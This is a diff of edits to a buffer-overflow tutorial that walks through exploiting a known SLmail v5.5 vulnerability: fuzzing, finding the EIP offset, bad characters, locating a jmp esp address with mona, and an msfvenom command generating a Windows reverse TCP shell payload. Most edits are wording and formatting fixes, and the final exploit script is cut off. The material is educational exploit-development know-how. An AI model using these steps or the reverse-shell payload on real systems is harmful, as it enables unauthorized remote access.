@@ -157,11 +157,11 @@ Randomization of the virtual memory addresses at which functions and variables c
 
 
 ## Proof of Concept
-In order to show a practicle buffer overflow example, SLmail v5.5 will be used. It has a known vulnerability which can be found in [exploit-db][https://www.exploit-db.com/exploits/638]. 
+In order to show a practicle buffer overflow example, SLmail v5.5 will be used. It has a known vulnerability which can be found in [exploit-db](https://www.exploit-db.com/exploits/638). 
 
 1. Crash the application by sending 'A's.
 
-Script fuzzing.py
+The following script (fuzzing.py) connects to the vulnerable service and sends 'A's in the password camp:
 ```python
 #!/usr/bin/python
 import time, struct, sys
@@ -211,6 +211,8 @@ for string in buff:
 ```
 
 After the script execution, EIP value is overwrite with 41414141 which is the ASCII value of AAAA:
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/fuzzing1.png)
 
 Calculate how many bytes are needed to make the software crash. In this example, 2900 bytes:
 
@@ -269,8 +271,7 @@ pattern_offset.rb -q EIP_VALUE
 ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/pattern_offset.png)
 
 
-3. Check if you have full control of the EIP by sending 'A'*offset + 'B'*4 + 'C's
-By sending the script check_eip.py, it is possible to know if you have control of the EIP. If so, EIP should have 4 'B's.
+3. Check if you have full control of the EIP by sending 'A'*offset + 'B'*4 + 'C's by sending the script check_eip.py. If so, EIP should have 4 'B's.
 ```python
 #!/usr/bin/python
 
@@ -314,8 +315,7 @@ In memory, you can see how it has been overwrited with 'A', the EIP with 4 'B' a
 4. Find space for the shellcode
 
 
-5. Discover bad characters by looking which of them are not correctly printed (Remember to include always \x00)
-The script badchars.py checks which characters cannot be sent due to the software would crash.
+5. Discover bad characters by looking which of them are not correctly printed (Remember to include always \x00). The script badchars.py sends all characters, from 0x01 to 0xFF:
 ```python
 #!/usr/bin/python
 
@@ -367,7 +367,7 @@ except:
 
 ```
 
-After sending the script, if you look into the memory you can see how the characters from 0x01 to 0x09 are displayed correctly. However, after 0x09 all the following characters are broken:
+After executing the script, if you look into the memory you can see how the characters from 0x01 to 0x09 are displayed correctly. However, after 0x09 all the following characters are broken:
 
 ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/badchar_0a.png)
 
@@ -383,7 +383,7 @@ After adding the badchars 0x00, 0x0A and 0x0D, you can see how all the character
 
 ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/badchars_end.png)
 
-So. all characters from 0x01 to 0xFF, except 0x00, 0x0A and 0x0D, are correctly represented.
+So. all characters from 0x01 to 0xFF, except for 0x00, 0x0A and 0x0D, are correctly represented.
 
 6. Find the return address
 Calculate op code of jmp esp using nasm_shell.rb:
@@ -404,8 +404,9 @@ Search for a dll which has the values "rebase", "safeSEH", "ASLR" and "NXCompact
 Look for a "jmp esp" inside the dll:
 ```
 !mona find -s "OP_CODE" -m "DLL_NAME.dll"
+```
 
-Select any pointer and copy its address
+Select any pointer and copy its address:
 
 ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/mona_find.png)
 
@@ -413,11 +414,14 @@ Select any pointer and copy its address
 7. Create a shell
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f py -b "BADCHARS"
+```
 
 ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/msfvenom.png)
 
 
 8. Exploit
+Modify the exploit by adding the value of the offset, the jmp esp address, nops and the payload:
+
 ```python
 #!/usr/bin/python
 # coding=utf-8
